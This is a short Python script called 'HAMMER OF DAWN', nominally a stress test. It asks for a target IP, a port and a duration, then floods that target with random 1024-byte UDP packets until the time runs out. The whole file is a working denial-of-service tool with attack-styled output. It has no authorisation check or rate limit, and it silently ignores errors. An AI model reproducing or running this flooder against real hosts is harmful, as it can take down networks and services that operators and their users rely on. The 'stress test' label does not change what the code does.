#!/usr/bin/env python3
# ╔══════════════════════════════════════════════════════════════════════════╗
# ║ MODULE: HAMMER OF DAWN v1.0 [STRESS TEST]                                ║
# ║ TARGET: NETWORK INFRASTRUCTURE                                           ║
# ╚══════════════════════════════════════════════════════════════════════════╝

import socket
import random
import time
import sys
import os

# COLORS
R = '\033[1;31m'
W = '\033[1;37m'
N = '\033[0m'

def banner():
    os.system('clear')
    print(f"{R}>>> HAMMER OF DAWN ACTIVATED <<<{N}")

def attack(ip, port, duration):
    timeout = time.time() + float(duration)
    sent = 0
    bytes = random._urandom(1024)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        if time.time() > timeout:
            break
        try:
            sock.sendto(bytes, (ip, int(port)))
            sent += 1
            print(f"{R}[FIRE]{N} PACKET {sent} -> {ip}:{port}")
        except KeyboardInterrupt:
            sys.exit()
        except:
            pass
            
    print(f"\n{W}>>> ATTACK FINISHED.{N}")
    input("PRESS ENTER")

def main():
    banner()
    target = input(f"{W}TARGET IP >> {N}")
    port = input(f"{W}PORT (80/443/53) >> {N}")
    duration = input(f"{W}DURATION (Seconds) >> {N}")
    
    print(f"{R}[!] WARNING: HIGH BANDWIDTH USAGE.{N}")
    time.sleep(1)
    attack(target, port, duration)

if __name__ == "__main__":
    main()

